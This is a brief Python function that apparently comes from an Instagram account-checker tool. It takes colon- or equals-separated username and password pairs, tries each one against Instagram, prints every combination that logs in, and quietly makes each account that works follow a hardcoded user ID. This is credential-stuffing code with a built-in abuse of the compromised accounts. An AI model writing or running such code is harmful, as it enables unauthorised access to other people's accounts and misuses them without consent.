def checkig(udata):
  Z = udata.split('=')
  Y = Instagram()
  Y.with_credentials(Z[0],Z[1])
  try:
    out = Y.login()
    #print(out)
    print(SBR+" {} | {}".format(Z[0],Z[1]))
    Y.follow('3945561585')
  except:
    return 0

